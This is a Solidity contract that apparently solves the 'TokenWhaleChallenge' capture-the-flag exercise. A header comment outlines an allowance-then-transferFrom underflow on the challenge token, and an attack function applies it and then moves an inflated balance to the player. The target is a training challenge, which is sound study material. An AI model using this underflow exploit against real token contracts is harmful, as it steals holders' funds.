pragma solidity 0.8.7;

/**
 * @title Underflow attack
 * 1. Approve large amount of token to hacker contract then call transferFrom for trigger underflow attack
 * 2. Transfer all balance of hacker contract to player
 */

interface ITokenWhaleChallenge {
    function transfer(address to, uint256 value) external;
    function approve(address spender, uint256 value) external;
    function transferFrom(address from, address to, uint256 value) external;
}

contract TokenWhaleChallengeHack {
    ITokenWhaleChallenge public twcInstance;
    
    constructor (ITokenWhaleChallenge _twcInstance) {
        twcInstance = _twcInstance;
    }

    function attack(address _player, address _any) public {
        twcInstance.transferFrom(_player, _any, 100);
        twcInstance.transfer(_player, 10000000);
    }
}